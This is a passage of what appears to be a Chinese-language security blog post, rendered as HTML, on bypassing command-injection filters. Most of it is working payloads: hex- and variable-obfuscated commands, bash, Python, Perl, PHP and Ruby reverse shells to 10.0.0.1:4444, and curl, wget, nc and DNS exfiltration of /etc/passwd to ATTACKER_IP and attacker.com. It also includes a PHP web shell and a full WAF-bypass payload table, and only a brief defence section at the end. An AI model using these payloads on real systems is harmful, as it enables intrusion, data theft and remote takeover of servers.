-<h3 id="4-3-纯-’-x’-十六进制构造"><a href="#4-3-纯-’-x’-十六进制构造" class="headerlink" title="4.3 纯 $’\x’ 十六进制构造"></a>4.3 纯 $’\x’ 十六进制构造</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 构造 /bin/cat /etc/passwd 的所有十六进制字节</span></span><br><span class="line">cmd=$<span class="string">&#x27;\x2f\x62\x69\x6e\x2f\x63\x61\x74&#x27;</span></span><br><span class="line"><span class="variable">$cmd</span> $<span class="string">&#x27;\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="4-4-环境变量切片"><a href="#4-4-环境变量切片" class="headerlink" title="4.4 环境变量切片"></a>4.4 环境变量切片</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通过已知环境变量切片获取字母</span></span><br><span class="line"><span class="variable">$&#123;PWD&#125;</span>                 <span class="comment"># /var/www/html</span></span><br><span class="line"><span class="variable">$&#123;PWD:0:1&#125;</span>             <span class="comment"># /</span></span><br><span class="line"><span class="variable">$&#123;HOME&#125;</span>                <span class="comment"># /root 或 /home/user</span></span><br><span class="line"><span class="variable">$&#123;HOME:0:1&#125;</span>            <span class="comment"># /</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 逐字符构造命令（实战较繁琐，一般用于自动化工具）</span></span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="五、-dev-tcp-反弹-Shell"><a href="#五、-dev-tcp-反弹-Shell" class="headerlink" title="五、&#x2F;dev&#x2F;tcp 反弹 Shell"></a>五、&#x2F;dev&#x2F;tcp 反弹 Shell</h2><h3 id="5-1-核心原理"><a href="#5-1-核心原理" class="headerlink" title="5.1 核心原理"></a>5.1 核心原理</h3><p>Bash 内置了 <code>/dev/tcp</code> 伪文件系统，可建立 TCP 连接而无需外部工具（nc、socat 等）。</p>
-<h3 id="5-2-基础反弹-Shell"><a href="#5-2-基础反弹-Shell" class="headerlink" title="5.2 基础反弹 Shell"></a>5.2 基础反弹 Shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 标准 Bash 反弹 Shell</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 简短版</span></span><br><span class="line">sh -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 不依赖 bash 完整交互模式</span></span><br><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/10.0.0.1/4444</span><br><span class="line"><span class="built_in">cat</span> &lt;&amp;5 | <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="5-3-WAF-绕过版反弹-Shell"><a href="#5-3-WAF-绕过版反弹-Shell" class="headerlink" title="5.3 WAF 绕过版反弹 Shell"></a>5.3 WAF 绕过版反弹 Shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Base64 编码反弹 Shell</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=&quot;</span> | <span class="built_in">base64</span> -d | bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 变量拼接版</span></span><br><span class="line">A=dev; B=tcp; C=10.0.0.1; D=4444</span><br><span class="line">bash -i &gt;&amp; /<span class="variable">$A</span>/<span class="variable">$B</span>/<span class="variable">$C</span>/<span class="variable">$D</span> 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 十六进制版</span></span><br><span class="line">bash -i &gt;&amp; /dev$<span class="string">&#x27;\x2f&#x27;</span>tcp$<span class="string">&#x27;\x2f&#x27;</span>10.0.0.1$<span class="string">&#x27;\x2f&#x27;</span>4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-
-<h3 id="5-4-多端口-多形式反弹"><a href="#5-4-多端口-多形式反弹" class="headerlink" title="5.4 多端口 &#x2F; 多形式反弹"></a>5.4 多端口 &#x2F; 多形式反弹</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># UD&gt;### 5.4 多端口 / 多形式反弹</span></span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line"><span class="comment"># UDP 反弹（需目标支持 /dev/udp）</span></span><br><span class="line">sh -i &gt;&amp; /dev/udp/10.0.0.1/4444 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python 反弹（备用方案）</span></span><br><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Perl 反弹</span></span><br><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;10.0.0.1&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP 反弹</span></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Ruby 反弹</span></span><br><span class="line">ruby -rsocket -e<span class="string">&#x27;f=TCPSocket.open(&quot;10.0.0.1&quot;,4444).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="六、数据外带-—-curl-wget"><a href="#六、数据外带-—-curl-wget" class="headerlink" title="六、数据外带 — curl &#x2F; wget"></a>六、数据外带 — curl &#x2F; wget</h2><h3 id="6-1-curl-外带数据"><a href="#6-1-curl-外带数据" class="headerlink" title="6.1 curl 外带数据"></a>6.1 curl 外带数据</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># GET 方式外带文件（URL 中嵌入数据）</span></span><br><span class="line">curl <span class="string">&quot;http://ATTACKER_IP/<span class="subst">$(cat /etc/passwd | base64)</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># POST 方式外带文件</span></span><br><span class="line">curl -X POST -d <span class="string">&quot;<span class="subst">$(cat /etc/passwd)</span>&quot;</span> http://ATTACKER_IP/collect</span><br><span class="line"></span><br><span class="line"><span class="comment"># 外带含特殊字符的文件（base64 编码避免传输错误）</span></span><br><span class="line">curl <span class="string">&quot;http://ATTACKER_IP/?d=<span class="subst">$(cat /etc/passwd | base64 | tr -d &#x27;\n&#x27;)</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 逐文件外带当前目录</span></span><br><span class="line">curl -F <span class="string">&quot;file=@/etc/passwd&quot;</span> http://ATTACKER_IP/upload</span><br><span class="line"></span><br><span class="line"><span class="comment"># 多文件打包外带</span></span><br><span class="line">tar czf - /var/www/html | curl -X POST --data-binary @- http://ATTACKER_IP/backup.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过请求头外带（绕过部分 URL 长度限制）</span></span><br><span class="line">curl -H <span class="string">&quot;X-Data: <span class="subst">$(cat /etc/passwd | base64 -w0)</span>&quot;</span> http://ATTACKER_IP/</span><br></pre></td></tr></table></figure>
-
-<h3 id="6-2-wget-外带数据"><a href="#6-2-wget-外带数据" class="headerlink" title="6.2 wget 外带数据"></a>6.2 wget 外带数据</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># wget 直接 GET（数据在 URL 路径）</span></span><br><span class="line">wget <span class="string">&quot;http://ATTACKER_IP/<span class="subst">$(cat /etc/passwd | base64 -w0)</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># wget POST（需较新版本，--post-data 支持）</span></span><br><span class="line">wget --post-data=<span class="string">&quot;data=<span class="subst">$(cat /etc/passwd | base64 -w0)</span>&quot;</span> http://ATTACKER_IP/</span><br><span class="line"></span><br><span class="line"><span class="comment"># wget 递归下载或自定义 header</span></span><br><span class="line">wget --header=<span class="string">&quot;X-Exfil: <span class="subst">$(cat /etc/passwd | base64 -w0)</span>&quot;</span> http://ATTACKER_IP/</span><br></pre></td></tr></table></figure>
-
-<h3 id="6-3-其他网络工具外带"><a href="#6-3-其他网络工具外带" class="headerlink" title="6.3 其他网络工具外带"></a>6.3 其他网络工具外带</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nc 直接传文件</span></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd | nc ATTACKER_IP 4444</span><br><span class="line"></span><br><span class="line"><span class="comment"># telnet 外带</span></span><br><span class="line">telnet ATTACKER_IP 4444 &lt; /etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># nslookup（配合 DNS 外带，见下节）</span></span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="七、DNS-外带-—-Blind-命令注入利器"><a href="#七、DNS-外带-—-Blind-命令注入利器" class="headerlink" title="七、DNS 外带 — Blind 命令注入利器"></a>七、DNS 外带 — Blind 命令注入利器</h2><h3 id="7-1-基本原理"><a href="#7-1-基本原理" class="headerlink" title="7.1 基本原理"></a>7.1 基本原理</h3><p>当目标无法出站建立 TCP&#x2F;HTTP 连接时（不出网），DNS 查询往往仍然允许。通过将命令结果编码为 DNS 域名前缀发起查询，可在攻击者 DNS 服务器上获取数据。</p>
-<h3 id="7-2-基础-DNS-外带"><a href="#7-2-基础-DNS-外带" class="headerlink" title="7.2 基础 DNS 外带"></a>7.2 基础 DNS 外带</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Linux 环境</span></span><br><span class="line">nslookup <span class="string">&quot;<span class="subst">$(cat /etc/passwd | base64 | tr -d &#x27;\n&#x27;)</span>.attacker.com&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 短结果（如 whoami）</span></span><br><span class="line">nslookup <span class="string">&quot;<span class="subst">$(whoami)</span>.attacker.com&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 多级分割（结果过长时分段）</span></span><br><span class="line">cmd=$(<span class="built_in">cat</span> /etc/passwd | <span class="built_in">base64</span> -w0)</span><br><span class="line">nslookup <span class="string">&quot;part1-<span class="variable">$&#123;cmd:0:30&#125;</span>.attacker.com&quot;</span></span><br><span class="line">nslookup <span class="string">&quot;part2-<span class="variable">$&#123;cmd:30:30&#125;</span>.attacker.com&quot;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="7-3-逐行外带"><a href="#7-3-逐行外带" class="headerlink" title="7.3 逐行外带"></a>7.3 逐行外带</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将文件内容逐行外带</span></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd | <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span></span><br><span class="line">    nslookup <span class="string">&quot;<span class="subst">$(echo $line | base64)</span>.attacker.com&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 dig（更灵活）</span></span><br><span class="line">dig <span class="string">&quot;<span class="subst">$(id | base64 -w0)</span>.attacker.com&quot;</span> A +short</span><br></pre></td></tr></table></figure>
-
-<h3 id="7-4-外带命令执行输出"><a href="#7-4-外带命令执行输出" class="headerlink" title="7.4 外带命令执行输出"></a>7.4 外带命令执行输出</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 执行命令并外带</span></span><br><span class="line">cmd=<span class="string">&quot;ls -la /home&quot;</span></span><br><span class="line">nslookup <span class="string">&quot;<span class="subst">$($cmd | base64 -w0)</span>.attacker.com&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 脚本化：遍历目标目录</span></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> /home/*; <span class="keyword">do</span></span><br><span class="line">    nslookup <span class="string">&quot;<span class="subst">$(echo $f | base64 -w0)</span>.attacker.com&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="7-5-攻击端接收配置"><a href="#7-5-攻击端接收配置" class="headerlink" title="7.5 攻击端接收配置"></a>7.5 攻击端接收配置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 攻击机器启动 DNS 监听（tcpdump）</span></span><br><span class="line">tcpdump -i eth0 -nn dst port 53 | grep attacker.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或使用专用工具</span></span><br><span class="line">python3 -m http.server 80 &amp;           <span class="comment"># 接收 http 请求</span></span><br><span class="line"><span class="built_in">tail</span> -f /var/log/named/queries.log    <span class="comment"># 查看 DNS 查询日志</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 攻击端抓取并解码</span></span><br><span class="line">tcpdump -i eth0 -nn dst port 53 -l | \</span><br><span class="line">  awk <span class="string">&#x27;&#123;print $NF&#125;&#x27;</span> | \</span><br><span class="line">  sed <span class="string">&#x27;s/\.attacker\.com\.//&#x27;</span> | \</span><br><span class="line">  <span class="keyword">while</span> <span class="built_in">read</span> b64; <span class="keyword">do</span> <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$b64</span>&quot;</span> | <span class="built_in">base64</span> -d; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="7-6-完整-DNS-外带脚本示例"><a href="#7-6-完整-DNS-外带脚本示例" class="headerlink" title="7.6 完整 DNS 外带脚本示例"></a>7.6 完整 DNS 外带脚本示例</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># 目标机执行：将结果通过 DNS 外带</span></span><br><span class="line">ATTACKER_DNS=<span class="string">&quot;attacker.com&quot;</span></span><br><span class="line">TARGET_FILE=<span class="string">&quot;/etc/passwd&quot;</span></span><br><span class="line"></span><br><span class="line">DATA=$(<span class="built_in">cat</span> <span class="variable">$TARGET_FILE</span> | <span class="built_in">base64</span> -w0 | <span class="built_in">tr</span> <span class="string">&#x27;+/=&#x27;</span> <span class="string">&#x27;.-_&#x27;</span>)</span><br><span class="line">CHUNK_SIZE=30</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">seq</span> 0 <span class="variable">$CHUNK_SIZE</span> <span class="variable">$&#123;#DATA&#125;</span>); <span class="keyword">do</span></span><br><span class="line">    CHUNK=<span class="string">&quot;<span class="variable">$&#123;DATA:$i:$CHUNK_SIZE&#125;</span>&quot;</span></span><br><span class="line">    nslookup <span class="string">&quot;<span class="variable">$&#123;CHUNK&#125;</span>.<span class="variable">$ATTACKER_DNS</span>&quot;</span> &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">    <span class="built_in">sleep</span> 0.2</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="八、其他高级绕过技巧"><a href="#八、其他高级绕过技巧" class="headerlink" title="八、其他高级绕过技巧"></a>八、其他高级绕过技巧</h2><h3 id="8-1-空格绕过"><a href="#8-1-空格绕过" class="headerlink" title="8.1 空格绕过"></a>8.1 空格绕过</h3><table>
-<thead>
-<tr>
-<th>技巧</th>
-<th>示例</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>${IFS}</code></td>
-<td><code>cat${IFS}/etc/passwd</code></td>
-</tr>
-<tr>
-<td><code>$IFS</code></td>
-<td><code>cat$IFS/etc/passwd</code></td>
-</tr>
-<tr>
-<td><code>&lt;</code> 输入重定向</td>
-<td><code>cat&lt;/etc/passwd</code></td>
-</tr>
-<tr>
-<td><code>&lt;&gt;</code> 重定向</td>
-<td><code>cat&lt;&gt;/etc/passwd</code></td>
-</tr>
-<tr>
-<td>花括号扩展</td>
-<td><code>{cat,/etc/passwd}</code></td>
-</tr>
-<tr>
-<td>Tab (<code>%09</code>)</td>
-<td><code>cat%09/etc/passwd</code></td>
-</tr>
-<tr>
-<td>变量绕空格</td>
-<td><code>X=$&#39;\x20&#39;; cat${X}/etc/passwd</code></td>
-</tr>
-</tbody></table>
-<h3 id="8-2-路径穿越与文件读取"><a href="#8-2-路径穿越与文件读取" class="headerlink" title="8.2 路径穿越与文件读取"></a>8.2 路径穿越与文件读取</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 构造 /etc/passwd 路径</span></span><br><span class="line">/etc/passwd</span><br><span class="line">/./etc/./passwd</span><br><span class="line">//etc//passwd</span><br><span class="line">/../etc/passwd/..</span><br><span class="line">/etc/../etc/passwd/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 符号链接利用（如果可创建）</span></span><br><span class="line"><span class="built_in">ln</span> -s /etc/passwd /tmp/link &amp;&amp; <span class="built_in">cat</span> /tmp/link</span><br></pre></td></tr></table></figure>
-
-<h3 id="8-3-命令分隔符替换"><a href="#8-3-命令分隔符替换" class="headerlink" title="8.3 命令分隔符替换"></a>8.3 命令分隔符替换</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># \x0a 换行替代</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ls%0acat%20/etc/passwd&quot;</span> | ...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 管道与逻辑运算符</span></span><br><span class="line">ping 127.0.0.1 | <span class="built_in">cat</span> /etc/passwd</span><br><span class="line">ping 127.0.0.1 || <span class="built_in">cat</span> /etc/passwd</span><br><span class="line">ping 127.0.0.1 &amp;&amp; <span class="built_in">cat</span> /etc/passwd</span><br><span class="line">ping 127.0.0.1 &amp; <span class="built_in">cat</span> /etc/passwd</span><br><span class="line">ping 127.0.0.1 %26%26 <span class="built_in">cat</span> /etc/passwd</span><br></pre></td></tr></table></figure>
-
-<h3 id="8-4-利用邮件与写入"><a href="#8-4-利用邮件与写入" class="headerlink" title="8.4 利用邮件与写入"></a>8.4 利用邮件与写入</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># mail 命令写文件</span></span><br><span class="line">mail -s <span class="string">&quot;x&quot;</span> user@localhost &lt; /tmp/result.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># tee 分流写入</span></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd | <span class="built_in">tee</span> /tmp/copy.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># dd 写文件</span></span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/etc/passwd of=/tmp/pass.bak</span><br><span class="line"></span><br><span class="line"><span class="comment"># 追加写入 Web 可访问目录</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;?php system(\$_GET[&#x27;cmd&#x27;]); ?&gt;&quot;</span> &gt; /var/www/html/shell.php</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="九、完整绕过技巧参考表"><a href="#九、完整绕过技巧参考表" class="headerlink" title="九、完整绕过技巧参考表"></a>九、完整绕过技巧参考表</h2><table>
-<thead>
-<tr>
-<th>场景</th>
-<th>绕过技术</th>
-<th>示例 Payload</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>过滤 <code>cat</code></td>
-<td>反斜杠</td>
-<td><code>c\a\t /etc/passwd</code></td>
-</tr>
-<tr>
-<td>过滤 <code>cat</code></td>
-<td>单引号</td>
-<td><code>c&#39;a&#39;t /etc/passwd</code></td>
-</tr>
-<tr>
-<td>过滤 <code>cat</code></td>
-<td>双引号</td>
-<td><code>c&quot;a&quot;t /etc/passwd</code></td>
-</tr>
-<tr>
-<td>过滤 <code>cat</code></td>
-<td>变量拼接</td>
-<td><code>ca$u /etc/passwd</code></td>
-</tr>
-<tr>
-<td>过滤 <code>cat</code></td>
-<td>Base64</td>
-<td><code>echo Y2F0... | base64 -d | sh</code></td>
-</tr>
-<tr>
-<td>过滤 <code>cat</code></td>
-<td>通配符</td>
-<td><code>/???/??? /???/??????</code></td>
-</tr>
-<tr>
-<td>过滤 <code>cat</code></td>
-<td>十六进制</td>
-<td><code>$&#39;\x63\x61\x74&#39; /etc/passwd</code></td>
-</tr>
-<tr>
-<td>过滤空格</td>
-<td><code>${IFS}</code></td>
-<td><code>cat${IFS}/etc/passwd</code></td>
-</tr>
-<tr>
-<td>过滤空格</td>
-<td><code>&lt;</code> 重定向</td>
-<td><code>cat&lt;/etc/passwd</code></td>
-</tr>
-<tr>
-<td>过滤空格</td>
-<td>Tab</td>
-<td><code>cat%09/etc/passwd</code></td>
-</tr>
-<tr>
-<td>过滤空格</td>
-<td><code>%20</code> 两次编码</td>
-<td><code>cat%2520/etc/passwd</code></td>
-</tr>
-<tr>
-<td>过滤 <code>/</code></td>
-<td>环境变量</td>
-<td><code>cat ${HOME:0:1}etc${HOME:0:1}passwd</code></td>
-</tr>
-<tr>
-<td>过滤 <code>/</code></td>
-<td><code>;cd</code> 切换</td>
-<td><code>cd etc; cd ..; cat passwd</code></td>
-</tr>
-<tr>
-<td>过滤回显</td>
-<td>DNS 外带</td>
-<td><code>nslookup $(cmd | base64).attacker.com</code></td>
-</tr>
-<tr>
-<td>过滤回显</td>
-<td>curl GET</td>
-<td><code>curl http://IP/$(cmd | base64)</code></td>
-</tr>
-<tr>
-<td>过滤回显</td>
-<td>curl POST</td>
-<td><code>curl -d &quot;$(cmd)&quot; http://IP/</code></td>
-</tr>
-<tr>
-<td>过滤回显</td>
-<td>文件写入 + 访问</td>
-<td><code>cmd &gt; /var/www/html/out.txt</code></td>
-</tr>
-<tr>
-<td>过滤回显</td>
-<td>&#x2F;dev&#x2F;tcp 反弹</td>
-<td><code>bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1</code></td>
-</tr>
-<tr>
-<td>过滤 <code>bash</code></td>
-<td>替代 Shell</td>
-<td><code>sh</code> &#x2F; <code>dash</code> &#x2F; <code>zsh</code> &#x2F; <code>busybox</code></td>
-</tr>
-<tr>
-<td>过滤 <code>sh</code>&#x2F;<code>bash</code></td>
-<td>脚本语言</td>
-<td><code>python</code> &#x2F; <code>perl</code> &#x2F; <code>ruby</code> &#x2F; <code>php</code></td>
-</tr>
-<tr>
-<td>过滤 <code>$()</code></td>
-<td>反引号</td>
-<td><code>`cat /etc/passwd`</code></td>
-</tr>
-<tr>
-<td>过滤 反引号</td>
-<td><code>$()</code></td>
-<td><code>$(cat /etc/passwd)</code></td>
-</tr>
-<tr>
-<td>过滤 <code>&amp;</code> <code>|</code></td>
-<td>换行</td>
-<td><code>%0acat%20/etc/passwd</code></td>
-</tr>
-<tr>
-<td>过滤 <code>;</code></td>
-<td><code>%0a</code></td>
-<td><code>%0acat%20/etc/passwd</code></td>
-</tr>
-<tr>
-<td>长度限制 &lt; 5</td>
-<td>文件创建拼接</td>
-<td><code>&gt;a; &gt;_; ls -t&gt;f; sh f</code></td>
-</tr>
-<tr>
-<td>长度限制</td>
-<td>wget 拉取</td>
-<td><code>wget IP/a; sh a</code></td>
-</tr>
-<tr>
-<td>无字母数字</td>
-<td>通配符</td>
-<td><code>/?[a-z][a-z]/[a-z]?</code></td>
-</tr>
-<tr>
-<td>无字母数字</td>
-<td>八进制&#x2F;十六进制</td>
-<td><code>$&#39;\154\163&#39;</code> (ls)</td>
-</tr>
-<tr>
-<td>WAF 阻断出站</td>
-<td>DNS 外带</td>
-<td><code>nslookup $(data).evil.com</code></td>
-</tr>
-<tr>
-<td>WAF 阻断出站</td>
-<td>ICMP 隧道</td>
-<td><code>ping -p $(xxd -p file) IP</code></td>
-</tr>
-<tr>
-<td>文件包含</td>
-<td><code>file://</code> 协议</td>
-<td><code>curl file:///etc/passwd</code></td>
-</tr>
-<tr>
-<td>文件包含</td>
-<td><code>/proc</code> 读取</td>
-<td><code>cat /proc/self/environ</code></td>
-</tr>
-<tr>
-<td>进程注入</td>
-<td><code>tee</code> &#x2F; <code>dd</code></td>
-<td><code>cmd | tee /proc/self/fd/0</code></td>
-</tr>
-</tbody></table>
-<hr>
-<h2 id="十、防御与检测建议"><a href="#十、防御与检测建议" class="headerlink" title="十、防御与检测建议"></a>十、防御与检测建议</h2><p>开发层面：</p>
-<ol>
-<li><strong>避免直接调用系统命令</strong>：优先使用语言内置 API 实现功能</li>
-<li><strong>白名单校验</strong>：仅允许预定义的命令和参数，而非试图过滤黑名单</li>
-<li><strong>参数化调用</strong>：使用参数数组形式调用命令（如 Python 的 <code>subprocess.run([&quot;ls&quot;, arg])</code>），避免 shell 解析</li>
-<li><strong>最小权限</strong>：Web 进程以最低权限运行，限制可执行命令范围</li>
-</ol>
-<p>运维与检测：</p>
-<ol start="5">
-<li><strong>WAF 规则</strong>：不仅检测常见关键字，还应覆盖编码变体、连接符、通配符</li>
-<li><strong>RASP</strong>：运行时应用自我保护，监控进程创建与异常子进程行为</li>
-<li><strong>网络监控</strong>：监控出站 DNS 查询频率、长度异常的域名请求、非白名单出站连接</li>
-<li><strong>日志审计</strong>：记录所有命令执行日志，便于事后追溯与告警</li>
-</ol>
-<hr>
